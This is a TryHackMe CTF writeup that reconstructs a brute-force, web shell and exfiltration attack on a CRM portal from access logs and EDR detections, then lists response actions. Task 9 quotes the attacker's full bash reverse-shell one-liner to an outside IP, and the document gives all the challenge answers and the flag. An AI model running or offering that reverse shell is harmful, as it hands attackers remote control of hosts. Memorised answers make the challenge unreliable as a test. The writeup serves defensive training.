# Portal Drop — TryHackMe Writeup

| Field      | Details              |
|------------|----------------------|
| Platform   | TryHackMe            |
| Room       | First Shift CTF (Portal Drop) |
| Difficulty | Easy                 |
| Category   | Log Analysis / Incident Response / DFIR |

---

## Introduction

Portal Drop is a DFIR-focused challenge embedded in the First Shift CTF room. The scenario revolves around a CRM web portal that was compromised through a brute-force attack, a web shell upload, and subsequent post-exploitation activity. The task is to analyse a provided access log file and an EDR dashboard to reconstruct the attacker's kill chain and respond to the detections.

**Artefacts provided:**
- CRM web server access log (combined format)
- EDR dashboard with live detections

---

## Investigation

### Task 1 — What is the IP address that initiated the brute force on the CRM web portal?

Opened the log file and filtered entries returning HTTP `401 Unauthorized`. A high volume of 401 responses from a single source indicates a brute-force login attempt.

```bash
grep " 401 " access-combined-crm.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

One IP dominates the 401 count by a wide margin.

> **Answer: `34.67.91.83`**

---

### Task 2 — How many successful and failed logins are seen in the logs?

Filtered the log on the login endpoint, then counted responses by status code — `200` for successful logins and `401` for failed attempts.

```bash
grep "/login" access-combined-crm.log | grep " 200 " | wc -l   # successes
grep "/login" access-combined-crm.log | grep " 401 " | wc -l   # failures
```

> **Answer: `18, 35`**

---

### Task 3 — Following the brute force, which user-agent was used for the file upload?

Filtered log entries from the attacker IP (`34.67.91.83`) that contain the word `upload`:

```bash
grep "34.67.91.83" access-combined-crm.log | grep -i "upload"
```

The `User-Agent` header in those entries reveals the tool used.

> **Answer: `python-requests/2.31.0`**

---

### Task 4 — What was the name of the suspicious file uploaded by the attacker?

The same filtered entries from Task 3 show the filename in the request URI.

> **Answer: `invoice.php`**

---

### Task 5 — At what time did the attacker first invoke the uploaded script?

From the filtered output, the first request that *calls* `invoice.php` (rather than uploading it) gives us the timestamp.

> **Answer: `2025-11-06 14:27:34`**

---

### Task 6 — What is the first decoded command the attacker ran on the CRM?

Cross-referencing the EDR dashboard, the first shell command executed via the web shell is logged. The parameter passed to the PHP script was URL-encoded; decoding it reveals a simple reconnaissance command.

> **Answer: `whoami`**

---

### Task 7 — Based on the attacker's activity, which MITRE ATT&CK Persistence sub-technique ID is most applicable?

The EDR flagged a **File Write: backdoor** detection. Looking up the corresponding tactic/technique on the MITRE ATT&CK framework for server-side scripts used for persistence maps to:

> **Answer: `T1505.003`** — Server Software Component: Web Shell

---

### Task 8 — Which process image executes attacker commands received from the web?

The EDR's **shell spawn** detection entry lists the initiating process in its details pane.

> **Answer: `/usr/sbin/php-fpm7.4`**

---

### Task 9 — What command allowed the attacker to open a bash reverse shell?

The same shell spawn detection shows the full reverse shell one-liner executed by the attacker:

> **Answer: `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`**

---

### Task 10 — Which Linux user executes the entered malicious commands?

Visible in the process context from the same EDR detection entry.

> **Answer: `www-data`**

---

### Task 11 — What sensitive CRM configuration file did the attacker access?

A third EDR detection labelled as **Discovery** shows the attacker using `find` to search for configuration files, then `cat`-ing one of them.

> **Answer: `/etc/trycrm/config.json`**

---

### Task 12 — Which domain was used to exfiltrate the CRM portal database?

The last command in the Discovery detection entry is a `curl` command piping data to an external domain, which is the exfiltration endpoint.

> **Answer: `portaldrop2025.xyz`**

---

## EDR Response

After analysing all four detections, the following response actions were taken in the EDR dashboard:

| Detection Entry       | Actions Taken                                                      |
|-----------------------|--------------------------------------------------------------------|
| File Write: backdoor  | Analyse root cause → Stop & quarantine malicious file              |
| Shell Spawn           | Terminate reverse shell connection → Block attacker IP (`115.58.148.86`) |
| Discovery             | Isolate host for DFIR → Block related IP → Analyse root cause      |
| Nginx config change   | Contact responsible user → Review config changes → Close as FP (if approved) |

Completing all 12 EDR response actions across the four entries awards the final flag.

> **Flag: `THM{p0rtal_dropp3d?}`**

---

## Summary

| Step                    | Method / Tool                            | Finding                        |
|-------------------------|------------------------------------------|--------------------------------|
| Brute Force Source      | Log filter — HTTP 401                    | `34.67.91.83`                  |
| Login Stats             | Log filter — `/login` + status codes     | 18 successful, 35 failed       |
| Upload User-Agent       | Log filter — IP + `upload`               | `python-requests/2.31.0`       |
| Web Shell Name          | Log URI                                  | `invoice.php`                  |
| First Script Invocation | Log timestamp                            | `2025-11-06 14:27:34`          |
| First Command           | EDR — web shell parameter decode         | `whoami`                       |
| Persistence Technique   | EDR — File Write: backdoor + MITRE       | `T1505.003`                    |
| Executing Process       | EDR — shell spawn details                | `/usr/sbin/php-fpm7.4`         |
| Reverse Shell Command   | EDR — shell spawn                        | `bash -i >& /dev/tcp/...`      |
| Malicious User          | EDR — process context                    | `www-data`                     |
| Sensitive File Accessed | EDR — Discovery detection                | `/etc/trycrm/config.json`      |
| Exfil Domain            | EDR — curl command                       | `portaldrop2025.xyz`           |
| Final Flag              | EDR response actions (all 12 completed)  | `THM{p0rtal_dropp3d?}`         |

---

## Key Takeaways

- High volumes of HTTP `401` responses from a single IP are a reliable brute-force indicator — monitor and alert on this pattern.
- `python-requests` as a User-Agent in production web logs is a red flag; legitimate users don't browse with a Python HTTP library.
- Uploading a `.php` web shell and then invoking it is a textbook initial access → execution chain (MITRE T1505.003). File upload endpoints should validate file type server-side, not just client-side.
- `www-data` executing interactive bash and spawning reverse shells is abnormal process behaviour that should be caught by any EDR with behavioural rules.
- Post-compromise, attackers routinely seek out config files (`/etc/`) for credentials — protect them with restrictive permissions (0600, owned by root).

---

*Writeup by v3n0m | TryHackMe*
